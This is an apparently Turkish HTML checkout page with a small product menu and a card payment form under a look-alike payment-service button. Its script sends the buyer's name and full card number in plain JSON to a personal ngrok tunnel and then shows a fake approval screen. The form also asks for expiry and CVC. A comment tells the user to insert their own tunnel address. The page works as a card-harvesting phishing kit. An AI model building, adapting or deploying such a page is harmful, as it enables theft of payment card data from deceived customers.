<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>A Pear Backend</title>
    <style>
        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .box { border: 1px solid #444; padding: 20px; border-radius: 15px; cursor: pointer; text-align: center; width: 150px; }
        #pay-screen { display: none; background: #111; padding: 30px; border-radius: 20px; width: 300px; text-align: center; border: 1px solid #555; }
        input { width: 90%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; background: #222; color: #fff; }
        .loader { border: 4px solid #333; border-top: 4px solid #00f; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="grid" id="menu">
        <div class="box" onclick="selectItem('Uçak Büyük', 50)">Uçak Büyük<br>50 TL</div>
        <div class="box" onclick="selectItem('Uçak', 40)">Uçak<br>40 TL</div>
        <div class="box" onclick="selectItem('Star Spiral', 30)">Star Spiral<br>30 TL</div>
        <div class="box" onclick="selectItem('Özel', 0)">Özel<br>??? TL</div>
    </div>

    <div id="pay-screen">
        <h3 id="order-title">Ödeme</h3>
        <input type="text" id="isim" placeholder="İsim Soyisim">
        <div id="ozel-div" style="display:none;"><input type="text" id="ozel" placeholder="Notunuz..."></div>
        <input type="text" id="kart" placeholder="Kart No (16 Hane)" maxlength="16" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
        <input type="text" id="tarih" placeholder="Tarih (AA/YY)" maxlength="5">
        <input type="text" id="cvc" placeholder="CVC (3 Hane)" maxlength="3" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
        <label><input type="checkbox" id="kabul"> Şartları kabul ediyorum.</label>
        <button onclick="pay()" style="width:100%; padding:10px; margin-top:10px;">Google 1 Ödeme Yap</button>
    </div>

    <div id="success" style="display:none; text-align:center;">
        <div class="loader"></div>
        <h3>İşleminiz Onaylandı</h3>
    </div>

    <script>
        function selectItem(name, price) {
            document.getElementById('menu').style.display = 'none';
            document.getElementById('pay-screen').style.display = 'block';
            document.getElementById('order-title').innerText = name + " - " + price + " TL";
            document.getElementById('ozel-div').style.display = (name === 'Özel') ? 'block' : 'none';
        }

        async function pay() {
            if(document.getElementById('kart').value.length !== 16 || !document.getElementById('kabul').checked) return alert("Hatalı veya eksik!");
            
            const data = {
                isim: document.getElementById('isim').value,
                urun: document.getElementById('order-title').innerText,
                ozel: document.getElementById('ozel').value,
                kart: document.getElementById('kart').value
            };

            // BURAYA KENDİ NGROK LİNKİNİ YAZ (Sonuna /siparis-al eklemeyi unutma!)
            const response = await fetch('https://punctual-villain-arson.ngrok-free.dev/siparis-al', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });

            if(response.ok) {
                document.getElementById('pay-screen').style.display = 'none';
                document.getElementById('success').style.display = 'block';
            }
        }
    </script>
</body>
</html>
